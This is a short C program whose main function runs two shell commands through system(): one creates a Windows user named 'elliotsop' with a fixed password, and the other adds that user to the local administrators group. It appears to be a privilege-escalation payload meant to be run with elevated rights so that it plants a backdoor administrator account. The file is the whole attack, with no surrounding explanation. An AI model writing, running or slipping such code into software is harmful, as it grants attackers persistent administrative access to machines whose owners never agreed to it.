#include <stdlib.h>

int main ()
{
	int i;
	i = system ("net user elliotsop password123! /add");
	i = system ("net localgroup administrators elliotsop /add");

	return 0;

}

